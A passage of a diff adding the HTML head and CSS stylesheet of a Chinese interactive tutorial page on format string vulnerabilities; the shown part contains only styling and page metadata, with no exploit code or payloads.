@@ -1,0 +1,3312 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="格式化字符串漏洞深度图解：从 printf 可变参数、栈布局，到任意读、任意写与防御。含可交互栈模拟器与 payload 计算器。">
+<title>格式化字符串漏洞 · 深度图解 2.0</title>
+<script>document.documentElement.classList.add('js');</script>
+<style>
+:root{
+  --bg:#06080b; --bg2:#080b10; --panel:#0a0f15; --panel2:#0c1219;
+  --line:rgba(255,255,255,.075); --line2:rgba(255,255,255,.14);
+  --ink:#e9eef4; --ink2:#a3afbd; --ink3:#75828f; --ink4:#4a5764;
+  --acid:#c8f94c; --cyan:#66e0ea; --amber:#ffc857; --red:#ff5f6d;
+  --violet:#bda2ff; --green:#8be28b;
+  --mono:ui-monospace,"SFMono-Regular","JetBrains Mono","Cascadia Code",Consolas,"Liberation Mono",monospace;
+  --sans:"Segoe UI Variable Display","Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  --content:1040px; --r:14px;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  margin:0;background:var(--bg);color:var(--ink);
+  font:400 16px/1.85 var(--sans);letter-spacing:.004em;
+  -webkit-font-smoothing:antialiased;overflow-x:hidden;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:-2;pointer-events:none;
+  background:
+    radial-gradient(1000px 560px at 12% -8%,rgba(200,249,76,.065),transparent 62%),
+    radial-gradient(900px 620px at 100% 4%,rgba(102,224,234,.045),transparent 62%),
+    linear-gradient(180deg,#07090c 0%,#05070a 58%,#070a0d 100%);
+}
+body::after{
+  content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;
+  background-image:linear-gradient(rgba(255,255,255,.022) 1px,transparent 1px),
+                   linear-gradient(90deg,rgba(255,255,255,.022) 1px,transparent 1px);
+  background-size:64px 64px;
+  -webkit-mask-image:radial-gradient(ellipse 85% 55% at 50% 0%,#000 18%,transparent 76%);
+  mask-image:radial-gradient(ellipse 85% 55% at 50% 0%,#000 18%,transparent 76%);
+}
+::selection{background:var(--acid);color:#0b0e04}
+::-webkit-scrollbar{width:9px;height:9px}
+::-webkit-scrollbar-track{background:#06080b}
+::-webkit-scrollbar-thumb{background:#1b242d;border-radius:5px;border:2px solid #06080b}
+::-webkit-scrollbar-thumb:hover{background:#2b3742}
+:focus-visible{outline:2px solid var(--acid);outline-offset:2px}
+a{color:var(--acid);text-decoration:none;border-bottom:1px solid rgba(200,249,76,.24);transition:border-color .2s}
+a:hover{border-bottom-color:var(--acid)}
+button,input{font:inherit;color:inherit}
+h1,h2,h3,h4{text-wrap:balance}
+p{text-wrap:pretty}
+
+/* ============ TOP BAR ============ */
+.readbar{position:fixed;left:0;top:0;height:2px;width:0;z-index:100;
+  background:linear-gradient(90deg,var(--acid),var(--cyan));box-shadow:0 0 14px rgba(200,249,76,.45)}
+.topbar{position:fixed;inset:0 0 auto;height:58px;z-index:90;display:flex;align-items:center;gap:16px;
+  padding:0 20px;background:rgba(6,8,11,.82);backdrop-filter:blur(16px);border-bottom:1px solid var(--line)}
+.menu-btn{display:none;width:34px;height:34px;flex:none;border:1px solid var(--line2);background:transparent;
+  border-radius:8px;cursor:pointer;position:relative}
+.menu-btn i{position:absolute;left:8px;right:8px;height:1.5px;background:var(--ink2);transition:.2s}
+.menu-btn i:nth-child(1){top:11px}.menu-btn i:nth-child(2){top:16px}.menu-btn i:nth-child(3){top:21px}
+.menu-btn:hover i{background:var(--acid)}
+.brand{display:flex;align-items:center;gap:10px;border:0;color:var(--ink);
+  font:600 12px var(--mono);letter-spacing:.14em;white-space:nowrap}
+.brand:hover{border:0}
+.brand .logo{width:26px;height:26px;border-radius:7px;background:var(--acid);color:#101400;
+  display:grid;place-items:center;font:800 10px var(--mono);letter-spacing:0;
+  box-shadow:0 0 26px rgba(200,249,76,.22)}
+.brand .slash{color:var(--ink4);font-weight:400}
+.top-current{margin-left:6px;padding-left:16px;border-left:1px solid var(--line);
+  font:10.5px var(--mono);color:var(--ink3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:36vw}
+.top-right{margin-left:auto;display:flex;align-items:center;gap:12px;
+  font:9.5px var(--mono);letter-spacing:.12em;color:var(--ink4);white-space:nowrap}
+.top-pct{color:var(--acid);font-size:11px;min-width:34px;text-align:right}
+.top-dot{width:5px;height:5px;border-radius:50%;background:var(--acid);
+  box-shadow:0 0 8px var(--acid);animation:pulse 2.4s infinite}
+@keyframes pulse{0%,100%{opacity:.35}50%{opacity:1}}
+@media(max-width:1179px){.menu-btn{display:block}}
+@media(max-width:720px){.top-current{display:none}.top-right span:last-child{display:none}}
+
+/* ============ SIDEBAR ============ */
+.sidebar{position:fixed;top:58px;left:0;bottom:0;width:268px;z-index:80;display:flex;flex-direction:column;
+  padding:20px 16px 18px;border-right:1px solid var(--line);background:rgba(7,10,14,.92);
+  backdrop-filter:blur(10px);overflow-y:auto}
+.side-head{padding:0 8px 14px;border-bottom:1px solid var(--line);margin-bottom:8px}
+.side-kicker{font:9px var(--mono);letter-spacing:.22em;color:var(--ink4)}
+.side-title{margin-top:6px;font:700 14px/1.5 var(--sans);color:var(--ink)}
+.side-title span{color:var(--acid)}
+.toc{display:flex;flex-direction:column;gap:1px}
+.toc-label{margin:13px 8px 5px;font:8.5px var(--mono);letter-spacing:.2em;color:var(--ink4);text-transform:uppercase}
+.toc a{display:flex;align-items:flex-start;gap:9px;padding:6px 9px;border-radius:7px;
+  border:0;border-left:2px solid transparent;color:var(--ink3);font-size:12.5px;line-height:1.55;transition:.18s}
+.toc a .n{font:9.5px var(--mono);color:var(--ink4);padding-top:2px;flex:none;width:18px}
+.toc a .t{flex:1}
+.toc a:hover{color:var(--ink);background:rgba(255,255,255,.035);border-left-color:var(--line2)}
+.toc a.on{color:var(--acid);background:rgba(200,249,76,.055);border-left-color:var(--acid)}
+.toc a.on .n{color:var(--acid)}
+.side-foot{margin-top:auto;padding:18px 8px 0;border-top:1px solid var(--line);font-size:11px;color:var(--ink4)}
+.legend{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin:10px 0 14px}
+.legend span{display:flex;align-items:center;gap:6px;font:9.5px var(--mono);color:var(--ink3)}
+.legend i{width:6px;height:6px;border-radius:2px;display:inline-block;flex:none}
+.side-progress{height:3px;background:#141b23;border-radius:2px;overflow:hidden;margin-top:8px}
+.side-progress i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--acid),var(--cyan));transition:width .1s linear}
+.side-pct{display:flex;justify-content:space-between;margin-top:6px;font:9px var(--mono);color:var(--ink4)}
+@media(max-width:1179px){.sidebar{display:none}}
+
+/* ============ DRAWER ============ */
+.drawer{position:fixed;inset:0;z-index:110;visibility:hidden;opacity:0;transition:opacity .25s,visibility .25s}
+.drawer.open{visibility:visible;opacity:1}
+.drawer-bg{position:absolute;inset:0;background:rgba(0,0,0,.64);backdrop-filter:blur(6px)}
+.drawer-panel{position:absolute;top:0;left:0;bottom:0;width:min(86vw,330px);background:#070a0e;
+  border-right:1px solid var(--line2);padding:20px 16px 30px;overflow-y:auto;transform:translateX(-18px);transition:transform .3s}
+.drawer.open .drawer-panel{transform:none}
+.drawer-head{display:flex;align-items:center;justify-content:space-between;padding:0 6px 12px;
+  border-bottom:1px solid var(--line);margin-bottom:8px}
+.drawer-head b{font:600 11px var(--mono);letter-spacing:.14em;color:var(--ink2)}
+.drawer-close{width:30px;height:30px;border:1px solid var(--line2);border-radius:7px;background:transparent;
+  color:var(--ink3);cursor:pointer;font-size:15px;line-height:1}
+.drawer-close:hover{color:var(--acid);border-color:var(--acid)}
+body.no-scroll{overflow:hidden}
+
+/* ============ LAYOUT ============ */
+.main{margin-left:268px;min-height:100vh;position:relative}
+.content{max-width:calc(var(--content) + 88px);margin:0 auto;padding:58px 44px 0}
+@media(max-width:1179px){.main{margin-left:0}}
+@media(max-width:720px){.content{padding:58px 20px 0}}
+
+/* ============ HERO ============ */
+.hero{position:relative;padding:54px 0 48px;overflow:hidden}
+.hero-canvas{position:absolute;left:-44px;right:-44px;top:-58px;height:600px;z-index:0;opacity:.55;
+  pointer-events:none;-webkit-mask-image:linear-gradient(to bottom,#000 30%,transparent 92%);
+  mask-image:linear-gradient(to bottom,#000 30%,transparent 92%)}
+.hero-grid{position:relative;z-index:1;display:grid;grid-template-columns:minmax(0,1.12fr) minmax(0,.88fr);
+  gap:50px;align-items:center}
+.kicker{display:flex;flex-wrap:wrap;align-items:center;gap:10px;margin:0;
+  font:9.5px var(--mono);letter-spacing:.2em;color:var(--acid);text-transform:uppercase}
+.kicker span{color:var(--ink4)}
+.hero h1{margin:16px 0 12px;font-size:clamp(42px,5.2vw,74px);line-height:1.06;
+  letter-spacing:-.04em;font-weight:800;color:#f3f7fb}
+.hero h1 em{font-style:normal;color:var(--acid);position:relative;display:block;width:max-content}
+.hero h1 em::after{content:"";position:absolute;left:0;right:0;bottom:.06em;height:.08em;
+  background:var(--acid);opacity:.22;border-radius:2px}
+.hero-sub{margin:0 0 18px;font:11.5px/1.75 var(--mono);letter-spacing:.04em;color:var(--cyan)}
+.hero-lead{max-width:56ch;margin:0;font-size:16.5px;line-height:1.92;color:var(--ink2)}
+.hero-lead b{color:var(--ink);font-weight:600}
+.hero-meta{display:flex;flex-wrap:wrap;gap:7px;margin-top:22px}
+.chip{font:9.5px/1 var(--mono);letter-spacing:.05em;color:var(--ink3);
+  border:1px solid var(--line);background:rgba(255,255,255,.025);padding:7px 9px;border-radius:5px}
+.hero-actions{display:flex;flex-wrap:wrap;gap:10px;margin-top:28px}
+.hero-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;margin-top:36px;
+  border:1px solid var(--line);background:var(--line);border-radius:10px;overflow:hidden}
+.hstat{background:#080c11;padding:14px 16px}
+.hstat b{display:block;font:700 20px var(--mono);color:var(--acid);letter-spacing:-.03em}
+.hstat span{display:block;margin-top:4px;font-size:11px;color:var(--ink3);line-height:1.5}
+@media(max-width:1050px){.hero-grid{grid-template-columns:1fr;gap:38px}}
+@media(max-width:600px){.hero-stats{grid-template-columns:1fr}.hero-canvas{opacity:.35}}
+
+/* Terminal card */
+.term-card{position:relative;border:1px solid #1d2934;border-radius:14px;
+  background:linear-gradient(180deg,#0b1117,#080c10);
+  box-shadow:0 32px 80px rgba(0,0,0,.55),inset 0 1px 0 rgba(255,255,255,.04);
+  transform:perspective(1200px) rotateY(-6deg) rotateX(2deg);transition:transform .5s ease,border-color .3s}
+.term-card:hover{transform:none;border-color:#2b3a48}
+.term-flag{position:absolute;right:14px;top:-12px;z-index:2;font:700 8.5px var(--mono);letter-spacing:.12em;
+  color:#1a0508;background:var(--red);padding:6px 9px;border-radius:4px;
+  box-shadow:0 6px 20px rgba(255,95,109,.3)}
+.term-body{padding:18px 18px 20px;font:11.5px/1.95 var(--mono);color:#9dadbd;min-height:236px}
+.term-body>div{white-space:pre-wrap;word-break:break-all}
+.term-body .tp{color:var(--acid)}.term-body .td{color:#556574}.term-body .tc{color:var(--cyan)}
+.term-body .tr{color:var(--red)}.term-body .ty{color:var(--amber)}
+.caret{display:inline-block;width:6px;height:13px;background:var(--acid);vertical-align:-2px;
+  margin-left:2px;animation:blink 1.1s steps(1) infinite}
+@keyframes blink{50%{opacity:0}}
+.term-note{margin-top:14px;font:9px/1.7 var(--mono);color:var(--ink4);display:flex;gap:7px;align-items:flex-start}
+.term-note::before{content:"//";color:var(--acid);flex:none}
+
+/* Buttons */
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:11px 18px;border-radius:8px;
+  border:1px solid transparent;background:var(--acid);color:#101400;font:700 11.5px/1 var(--mono);
+  letter-spacing:.06em;cursor:pointer;transition:.2s;text-decoration:none;border-bottom:1px solid transparent}
+.btn:hover{background:#d7ff70;transform:translateY(-1px);box-shadow:0 10px 30px rgba(200,249,76,.2)}
+.btn.ghost{background:transparent;color:var(--ink2);border-color:var(--line2)}
+.btn.ghost:hover{color:var(--ink);border-color:var(--acid);box-shadow:none;background:rgba(200,249,76,.04)}
+.btn.sm{padding:8px 12px;font-size:10px}
+.btn.xs{padding:6px 9px;font-size:9px}
+.btn:disabled{opacity:.35;cursor:not-allowed;transform:none;box-shadow:none}
+.btn .ar{font-family:var(--sans);font-size:13px;line-height:1}
+
+/* ============ ROADMAP ============ */
+.roadmap{padding:10px 0 62px}
+.block-head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;margin-bottom:18px}
+.block-head .kicker{color:var(--ink3)}
+.block-head h2{margin:8px 0 0;font-size:clamp(20px,2.4vw,28px);letter-spacing:-.025em;line-height:1.35}
+.block-head p{margin:0;max-width:40ch;font-size:12.5px;line-height:1.8;color:var(--ink3);text-align:right}
+.chain{display:grid;grid-template-columns:repeat(5,1fr);gap:8px}
+.stage{position:relative;border:1px solid var(--line);border-radius:10px;
+  background:rgba(255,255,255,.018);padding:14px 13px;min-height:118px;transition:.2s}
+.stage:hover{border-color:var(--line2);background:rgba(255,255,255,.03)}
+.stage .si{font:8.5px var(--mono);letter-spacing:.14em;color:var(--ink4)}
+.stage h4{margin:8px 0 5px;font-size:13.5px;color:var(--ink);letter-spacing:-.01em}
+.stage p{margin:0;font-size:10.8px;line-height:1.7;color:var(--ink3)}
+.stage .dot{position:absolute;right:11px;top:13px;width:6px;height:6px;border-radius:50%;
+  background:var(--c,var(--ink4));box-shadow:0 0 10px var(--c,transparent)}
+.objectives{display:flex;flex-wrap:wrap;gap:8px 18px;align-items:flex-start;margin-top:14px;
+  padding:12px 14px;border:1px dashed var(--line2);border-radius:8px;font-size:12px;line-height:1.7;color:var(--ink3)}
+.objectives b{color:var(--acid);font:9px var(--mono);letter-spacing:.12em;white-space:nowrap}
+.objectives span{display:flex;align-items:center;gap:6px}
+.objectives i{font-style:normal;color:var(--acid)}
+@media(max-width:900px){.chain{grid-template-columns:repeat(3,1fr)}}
+@media(max-width:720px){.block-head{flex-direction:column;align-items:flex-start}.block-head p{text-align:left}}
+@media(max-width:600px){.chain{grid-template-columns:1fr 1fr}.stage:last-child{grid-column:1/-1}}
+@media(max-width:460px){.chain{grid-template-columns:1fr}}
+
+/* ============ SECTIONS ============ */
+.section{position:relative;padding:64px 0 70px;border-top:1px solid var(--line);scroll-margin-top:74px}
+.sec-head{position:relative;margin-bottom:30px;padding-right:100px}
+.sec-eyebrow{display:flex;align-items:center;gap:12px;font:9px var(--mono);
+  letter-spacing:.18em;color:var(--ink4);text-transform:uppercase}
+.sec-num{color:var(--acid);font-size:11px}
+.sec-rule{width:42px;height:1px;background:var(--line2);flex:none}
+.sec-en{color:var(--ink3)}
+.sec-head h2{margin:12px 0 9px;font-size:clamp(27px,3.2vw,38px);line-height:1.25;
+  letter-spacing:-.03em;font-weight:750;color:#f0f4f8}
+.sec-lead{margin:0;max-width:66ch;color:var(--ink2);font-size:15.5px;line-height:1.9}
+.sec-lead b{color:var(--ink);font-weight:600}
+.sec-ghost{position:absolute;right:0;top:-38px;font:800 120px/1 var(--mono);letter-spacing:-.08em;
+  color:transparent;-webkit-text-stroke:1px rgba(255,255,255,.055);pointer-events:none;user-select:none}
+@media(max-width:720px){.sec-head{padding-right:0}.sec-ghost{font-size:82px;top:-24px;opacity:.6}}
+
+.prose p{margin:0 0 15px;color:var(--ink2);max-width:74ch}
+.prose strong{color:var(--ink);font-weight:600}
+.prose ul,.prose ol{margin:12px 0 18px;padding-left:1.25em;color:var(--ink2);max-width:74ch}
+.prose li{margin:7px 0;padding-left:3px}
+.prose li::marker{color:var(--acid);font-family:var(--mono);font-size:.85em}
+.prose ol li::marker{font-size:.78em}
+h3{margin:38px 0 12px;font-size:19px;line-height:1.5;letter-spacing:-.015em;color:var(--ink);
+  font-weight:700;display:flex;align-items:center;gap:10px}
+h3::before{content:"";width:14px;height:2px;background:var(--acid);border-radius:2px;flex:none}
+h3 .h3-en{margin-left:auto;font:8.5px var(--mono);letter-spacing:.16em;color:var(--ink4);font-weight:400;white-space:nowrap}
+h4{margin:22px 0 8px;font-size:15px;color:var(--ink);font-weight:650}
+@media(max-width:600px){
+  h3{display:block}
+  h3::before{display:inline-block;vertical-align:middle;margin-right:8px}
+  h3 .h3-en{display:none}
+}
+
+code{font-family:var(--mono);font-size:.85em;color:#d9ff86;background:rgba(200,249,76,.075);
+  border:1px solid rgba(200,249,76,.14);padding:1.5px 5px;border-radius:4px;white-space:nowrap}
+a code{color:inherit}
+code.danger{color:#ffb3ba;background:rgba(255,95,109,.08);border-color:rgba(255,95,109,.18)}
+
+/* Callouts */
+.callout{--c:var(--cyan);position:relative;margin:20px 0;padding:16px 18px 16px 20px;
+  border:1px solid var(--line);border-left:2px solid var(--c);border-radius:9px;
+  background:linear-gradient(90deg,rgba(255,255,255,.026),transparent 60%),#0a0f15}
+.callout.danger{--c:var(--red)}.callout.fix{--c:var(--acid)}.callout.warn{--c:var(--amber)}
+.callout.note{--c:var(--violet)}.callout.tip{--c:var(--cyan)}
+.co-head{display:flex;align-items:center;gap:8px;margin-bottom:7px;
+  font:9px var(--mono);letter-spacing:.16em;color:var(--c);text-transform:uppercase}
+.co-head .ico{width:16px;height:16px;border:1px solid currentColor;border-radius:4px;
+  display:grid;place-items:center;font:9px var(--mono);flex:none}
+.callout p{margin:6px 0;font-size:14px;line-height:1.85;color:var(--ink2);max-width:none}
+.callout p:last-child{margin-bottom:0}
+.callout strong{color:var(--ink);font-weight:600}
+.callout pre{margin:10px 0 0;background:#070b0f;border:1px solid var(--line);border-radius:7px;
+  padding:10px 12px;font:11.5px/1.8 var(--mono);color:#b9c6d3;overflow-x:auto}
+.callout .mini-label{display:inline-block;font:8.5px var(--mono);letter-spacing:.1em;color:var(--c);
+  border:1px solid currentColor;border-radius:3px;padding:2px 5px;margin-right:6px;vertical-align:1px}
+
+/* Cards & grids */
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:16px 0}
+.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:16px 0}
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin:16px 0}
+@media(max-width:820px){.grid2,.grid3{grid-template-columns:1fr}.grid4{grid-template-columns:1fr 1fr}}
+@media(max-width:520px){.grid4{grid-template-columns:1fr}}
+.card{border:1px solid var(--line);border-radius:11px;background:#0a0f15;padding:17px 18px 15px}
+.card h4{margin:0 0 7px;font-size:14.5px;line-height:1.5}
+.card p{margin:6px 0;font-size:13.2px;line-height:1.8;color:var(--ink2);max-width:none}
+.card p:last-child{margin-bottom:0}
+.card .tag{display:inline-block;font:8.5px var(--mono);letter-spacing:.12em;color:var(--ink3);
+  border:1px solid var(--line2);padding:2px 5px;border-radius:3px;margin-bottom:8px}
+.card.acid{--c:var(--acid)}.card.cyan{--c:var(--cyan)}.card.amber{--c:var(--amber)}.card.red{--c:var(--red)}
+.card[class*="cy"],.card.acid,.card.cyan,.card.amber,.card.red{position:relative;overflow:hidden}
+.card.acid::before,.card.cyan::before,.card.amber::before,.card.red::before{
+  content:"";position:absolute;left:0;top:0;bottom:0;width:2px;background:var(--c,var(--line))}
+
+/* Levels */
+.levels{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:18px 0}
+.level{position:relative;border:1px solid var(--line);border-radius:11px;padding:17px 17px 15px;
+  background:#0a0f15;overflow:hidden}
+.level::before{content:"";position:absolute;left:0;right:0;top:0;height:2px;background:var(--c)}
+.level .lv{font:8.5px var(--mono);letter-spacing:.16em;color:var(--c)}
+.level h4{margin:8px 0 5px;font-size:15.5px;color:var(--ink)}
+.level p{margin:0;font-size:12.3px;color:var(--ink2);line-height:1.75}
+.level .spec{margin-top:10px;font:10.5px var(--mono);color:var(--c);word-break:break-all}
+.level.leak{--c:var(--cyan)}.level.read{--c:var(--amber)}.level.write{--c:var(--red)}
+@media(max-width:780px){.levels{grid-template-columns:1fr}}
+
+/* Tables */
+.table-wrap{overflow-x:auto;border:1px solid var(--line);border-radius:10px;margin:18px 0;background:#090e14}
+table{width:100%;border-collapse:collapse;font-size:13px;min-width:560px}
+th{font:9px var(--mono);letter-spacing:.12em;color:var(--ink3);text-transform:uppercase;text-align:left;
+  padding:10px 14px;background:#0b1016;border-bottom:1px solid var(--line);white-space:nowrap}
+td{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.05);color:var(--ink2);vertical-align:top;line-height:1.7}
+tr:last-child td{border-bottom:0}
+tr:hover td{background:rgba(255,255,255,.018)}
+td code{font-size:11.5px}
+th.risk,td.risk{text-align:right;white-space:nowrap}
+.badge{display:inline-flex;align-items:center;font:8px var(--mono);letter-spacing:.08em;
+  padding:2px 5px;border-radius:3px;border:1px solid currentColor;white-space:nowrap}
+.badge.leak{color:var(--cyan)}.badge.read{color:var(--amber)}.badge.write{color:var(--red)}.badge.safe{color:var(--ink3)}
+
+/* Code windows */
+.code,.term-out{position:relative;margin:18px 0;border:1px solid #1b2430;border-radius:11px;
+  background:#090d12;overflow:hidden;box-shadow:0 16px 44px rgba(0,0,0,.24)}
+.win-bar{display:flex;align-items:center;gap:10px;padding:9px 13px;border-bottom:1px solid #161e27;
+  background:#0b1016;font:9.5px var(--mono);color:var(--ink3);letter-spacing:.04em}
+.win-dots{display:flex;gap:5px;flex:none}
+.win-dots i{width:7px;height:7px;border-radius:50%;background:#26313d}
+.win-dots i:nth-child(1){background:rgba(255,95,109,.5)}
+.win-dots i:nth-child(2){background:rgba(255,200,87,.45)}
+.win-dots i:nth-child(3){background:rgba(139,226,139,.45)}
+.win-file{color:#93a1b0}
+.win-lang{margin-left:auto;color:var(--ink4);font-size:8.5px;letter-spacing:.14em;white-space:nowrap}
+.copy-btn{margin-left:8px;background:transparent;border:1px solid #232e3a;color:#7e8d9c;
+  font:8.5px var(--mono);letter-spacing:.12em;padding:4px 7px;border-radius:4px;cursor:pointer;transition:.18s;flex:none}
+.copy-btn:hover{color:var(--acid);border-color:rgba(200,249,76,.4)}
+.code pre{margin:0;padding:15px 17px;overflow-x:auto;font:12px/1.85 var(--mono);color:#c7d2dd;tab-size:4}
+.code pre code{background:none;border:0;border-radius:0;padding:0;color:inherit;font:inherit;white-space:normal}
+.code[data-lines] code{counter-reset:line}
+.code .cl{display:block;white-space:pre;min-height:1.85em}
+.code[data-lines] .cl{padding-left:2.7em;position:relative}
+.code[data-lines] .cl::before{content:counter(line);counter-increment:line;position:absolute;left:0;width:1.8em;
+  text-align:right;color:#354351;font-size:9.5px;top:.2em}
+.code .cl.mark{background:rgba(200,249,76,.055);box-shadow:inset 2px 0 0 rgba(200,249,76,.5)}
+.code .cl.mark.bad{background:rgba(255,95,109,.055);box-shadow:inset 2px 0 0 rgba(255,95,109,.55)}
+.tk-c{color:#5b6b7c;font-style:italic}
+.tk-s{color:#a8e6a3}
+.tk-n{color:#ffcc7a}
+.tk-k{color:#c8a6ff}
+.tk-p{color:#7fd6e0}
+.tk-r{color:#7fd6e0}
+.term-out pre{margin:0;padding:14px 17px;font:11.5px/1.85 var(--mono);color:#aab6c2;
+  white-space:pre-wrap;word-break:break-word}
+.t-p{color:var(--acid)}.t-dim{color:#55636f}.t-ok{color:var(--green)}.t-bad{color:var(--red)}
+.t-warn{color:var(--amber)}.t-key{color:var(--cyan)}
+@media(max-width:600px){
+  code{white-space:normal;overflow-wrap:anywhere}
+  .code pre{font-size:10.8px;padding:13px 12px}
+  .code[data-lines] .cl{padding-left:2.3em}
+  .term-out pre{font-size:10.8px}
+}
+
+/* Plain sketches */
+.sketch{margin:16px 0;padding:14px 16px;border:1px solid var(--line);border-radius:9px;background:#070b0f;
+  font:11.5px/1.85 var(--mono);color:#9fb0c0;overflow-x:auto;white-space:pre}
+.sketch b{color:var(--acid);font-weight:400}
+.sketch .c{color:#5e6d7e}
+.sketch .r{color:var(--red)}
+.sketch .cy{color:var(--cyan)}
+.sketch .am{color:var(--amber)}
+
+/* ============ LAB ============ */
+.lab{position:relative;margin:22px 0;border:1px solid #1b2530;border-radius:14px;
+  background:linear-gradient(180deg,#0b1016,#080c11);box-shadow:0 24px 60px rgba(0,0,0,.26);overflow:hidden}
+.lab::before,.lab::after{content:"";position:absolute;width:10px;height:10px;
+  border-color:rgba(200,249,76,.42);border-style:solid;pointer-events:none;z-index:2}
+.lab::before{top:7px;left:7px;border-width:1px 0 0 1px}
+.lab::after{bottom:7px;right:7px;border-width:0 1px 1px 0}
+.lab-head{display:flex;align-items:center;gap:12px;flex-wrap:wrap;padding:11px 18px;
+  border-bottom:1px solid #161f28;background:rgba(255,255,255,.014)}
+.lab-title{font:9.5px var(--mono);letter-spacing:.14em;color:var(--acid);white-space:nowrap}
+.lab-sub{font-size:11.5px;line-height:1.55;color:var(--ink3)}
+.lab-live{margin-left:auto;display:flex;align-items:center;gap:6px;
+  font:8.5px var(--mono);letter-spacing:.1em;color:var(--ink4);white-space:nowrap}
+.lab-live i{width:5px;height:5px;border-radius:50%;background:var(--acid);box-shadow:0 0 8px var(--acid)}
+.lab-body{padding:18px}
+.lab-foot{padding:0 18px 16px}
+.task{display:flex;gap:9px;align-items:flex-start;font-size:12px;line-height:1.7;color:var(--ink3);
+  padding:9px 12px;margin-bottom:14px;border:1px dashed rgba(255,255,255,.12);border-radius:7px;
+  background:rgba(255,255,255,.015)}
+.task b{color:var(--acid);font:8.5px var(--mono);letter-spacing:.1em;flex:none;padding-top:2px}
+.split{display:grid;grid-template-columns:minmax(0,1.12fr) minmax(0,.88fr);gap:18px;align-items:start}
+.split>div{min-width:0}
+.split.even{grid-template-columns:1fr 1fr}
+@media(max-width:860px){.split,.split.even{grid-template-columns:1fr}}
+.lab-side{min-width:0}
+.side-label{font:8.5px var(--mono);letter-spacing:.14em;color:var(--ink4);margin:0 0 6px;text-transform:uppercase}
+.ctrl-row{display:flex;flex-wrap:wrap;gap:7px;align-items:center;margin-top:11px}
+.field-row{display:flex;flex-wrap:wrap;gap:9px;align-items:flex-end;margin-bottom:12px}
+.field{display:flex;flex-direction:column;gap:5px;min-width:0}
+.field>span{font:8.5px var(--mono);letter-spacing:.1em;color:var(--ink4);text-transform:uppercase}
+.field input{width:100%;background:#060a0e;border:1px solid #222e3a;border-radius:7px;padding:8px 10px;
+  font:11.5px var(--mono);color:var(--ink);outline:none;transition:.18s}
+.field input:focus{border-color:rgba(200,249,76,.6);box-shadow:0 0 0 3px rgba(200,249,76,.08)}
+.field.grow{flex:1 1 250px}
+.field.w110{flex:0 0 110px}.field.w90{flex:0 0 90px}.field.w80{flex:0 0 80px}.field.w70{flex:0 0 70px}
+@media(max-width:600px){.field.w110,.field.w90,.field.w80,.field.w70{flex:1 1 40%}}
+.note{margin:11px 0 0;font-size:12px;line-height:1.8;color:var(--ink3)}
+.note b{color:var(--ink2);font-weight:500}
+.note.warn{color:var(--amber)}.note.bad{color:#ff9ba4}.note.good{color:var(--green)}
+.note code{font-size:10.5px}
+.step-cap{font:11px/1.75 var(--mono);color:var(--ink2);background:#070b0f;border:1px solid var(--line);
+  border-left:2px solid var(--acid);border-radius:6px;padding:9px 11px;min-height:42px}
+.step-cap b{color:var(--acid);font-weight:400}
+.step-cap .dim{color:var(--ink4)}
+.seg{display:inline-flex;background:#060a0e;border:1px solid var(--line);border-radius:7px;padding:3px;gap:2px}
+.seg button{border:0;background:transparent;color:var(--ink3);padding:5px 10px;border-radius:5px;
+  font:9.5px var(--mono);letter-spacing:.04em;cursor:pointer;transition:.18s}
+.seg button.on{background:rgba(200,249,76,.12);color:var(--acid)}
+.presets{display:flex;flex-wrap:wrap;gap:6px;margin:0 0 12px}
+.preset{font:9px var(--mono);letter-spacing:.02em;color:var(--ink3);background:transparent;
+  border:1px solid var(--line);border-radius:5px;padding:5px 8px;cursor:pointer;transition:.18s}
+.preset:hover{color:var(--acid);border-color:rgba(200,249,76,.4)}
+
+/* Stack view */
+.stack-view{border:1px solid #1a232d;border-radius:10px;background:#060a0e;overflow:hidden;font-family:var(--mono)}
+.stack-cap{display:flex;justify-content:space-between;padding:7px 11px;border-bottom:1px solid rgba(255,255,255,.05);
+  font:8px var(--mono);letter-spacing:.12em;color:var(--ink4);background:#080c10}
+.stack-row{display:grid;grid-template-columns:22px 88px minmax(78px,1fr) minmax(114px,1.45fr);
+  align-items:center;gap:7px;min-height:34px;padding:6px 10px;
+  border-bottom:1px solid rgba(255,255,255,.045);font-size:10.5px;
+  transition:background .2s,box-shadow .2s,opacity .2s}
+.stack-row:last-child{border-bottom:0}
+.stack-row .ap{color:var(--acid);font-size:7.5px;letter-spacing:-.02em;opacity:0;transition:.2s;white-space:nowrap}
+.stack-row .addr{color:#596b7c;font-size:9.5px;white-space:nowrap}
+.stack-row .val{color:#c8d5e1;font-size:10.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.stack-row .lbl{color:#6c7d8e;font-size:9px;line-height:1.45;text-align:right;overflow-wrap:anywhere}
+.stack-row.ctx{background:#05080b}
+.stack-row.ctx .addr{color:#3d4a56}
+.stack-row.ctx .val{color:#46535f;font-style:italic;font-weight:400}
+.stack-row.pending{opacity:.48}
+.stack-row.pending .val{color:#3d4a56;letter-spacing:.14em}
+.stack-row.hot{background:rgba(200,249,76,.06);box-shadow:inset 2px 0 0 var(--acid)}
+.stack-row.hot .ap{opacity:1}
+.stack-row.read{background:rgba(102,224,234,.045)}
+.stack-row.read .val{color:var(--cyan)}
+.stack-row.leaked{background:rgba(255,200,87,.06);box-shadow:inset 2px 0 0 var(--amber)}
+.stack-row.leaked .val{color:var(--amber)}
+.stack-row.wrote{background:rgba(255,95,109,.06);box-shadow:inset 2px 0 0 var(--red)}
